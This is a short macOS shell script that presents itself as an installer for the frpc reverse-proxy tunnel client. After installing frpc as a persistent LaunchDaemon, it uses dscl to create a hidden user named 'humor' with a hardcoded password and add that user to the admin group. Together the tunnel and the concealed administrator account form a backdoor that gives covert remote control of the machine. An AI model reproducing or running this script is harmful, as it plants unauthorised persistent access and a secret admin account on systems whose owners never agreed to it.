#!/bin/bash

dir=/usr/local/frpc
plist=/Library/LaunchDaemons/`whoami`.frpc.plist
user=humor
password=zhqadmin

sudo echo 'install frpc'

if [ ! -d $dir  ];then
    sudo mkdir $dir
fi

cp config.ini start.sh $dir/

cp mac/frpc $dir/

cp frpc.plist $plist

launchctl load -w $plist

dscl . -create /Users/$user IsHidden 1
dscl . -create /Users/$user  UserShell /bin/bash
dscl . -create /Users/$user  UniqueID 1001
dscl . -passwd /Users/$user $password
dscl . -append /Groups/admin GroupMembership $user
